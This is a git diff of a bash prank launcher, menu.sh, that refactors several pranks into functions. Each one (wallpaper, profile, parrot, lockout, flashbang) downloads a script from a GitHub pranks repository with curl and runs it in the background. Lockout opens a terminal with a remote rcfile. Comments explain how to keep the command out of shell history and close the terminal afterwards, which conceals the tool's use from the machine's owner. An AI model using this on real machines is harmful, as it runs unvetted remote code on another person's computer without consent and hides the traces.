@@ -5,6 +5,8 @@
 # Note: to execute this script, run "set +o history" to prevent menu.sh from being saved to history
 # Then launch menu.sh with a space appended to it to prevent it from being saved to readline
 
+# If no arguments are provided, the program will launch with whatever I last set it to
+
 # See which terminals exist on the user's machine
 if command -v "gnome-terminal" >/dev/null; then
 	SRC_LAUNCH="gnome-terminal -x"
@@ -13,6 +15,32 @@ elif command -v "konsole" >/dev/null; then
 else
 	SRC_LAUNCH=""
 fi;
+
+# Functions
+wallpaper() {
+	bash <(curl -s "$WALLPAPER") & disown
+}
+
+profile() {
+	bash <(curl -s "$PROFILE") & disown
+}
+
+parrot() {
+	bash <(curl -s "$PARROT") & disown
+}
+
+# Lockout gets opened in a new window instead of replacing the current terminal like before
+lockout() {
+	if [ "$SRC_LAUNCH" ] ; then
+		$SRC_LAUNCH bash --rcfile <(curl -s "$LOCKOUT") -i & disown
+	else
+		printf "wat da hell is this distro bro\n" # if mainstream terminals don't exist
+	fi
+}
+
+flashbang() {
+	bash <(curl -s "$FLASHBANG") & disown
+}
 
 # URLs
 WALLPAPER="https://raw.githubusercontent.com/heixier/pranks/refs/heads/main/wallpaper/change_bg.sh"
@@ -26,31 +54,31 @@ for opt in "$@"
 do
 	case "$opt" in
 		"bg" | "wallpaper")
-			bash <(curl -s "$WALLPAPER") & disown
+			wallpaper
 			;;
 
 		"profile" | "icon" | face)
-			bash <(curl -s "$PROFILE") & disown
+			profile
 			;;
 
 		"parrot")
-			bash <(curl -s "$PARROT") & disown
+			parrot
 			;;
 
-		"lockout") # This one gets opened in a new window instead of replacing the current terminal like before
-			if [ "$SRC_LAUNCH" ] ; then
-				$SRC_LAUNCH bash --rcfile <(curl -s "$LOCKOUT") -i & disown
-			else
-				printf "wat da hell is this distro bro\n" # no idea what terminal they're using
-			fi
+		"lockout") 
+			lockout
 			;;
+
 		"flash" | "flashbang")
-			bash <(curl -s "$FLASHBANG") & disown
+			flashbang
 			;;
+
 		*)
+			parrot
+			wallpaper
 			;;
 	esac
 done
 
-# Remember to append && exit
+# Remember to append "&& exit"
 # e.g bash menu.sh && exit
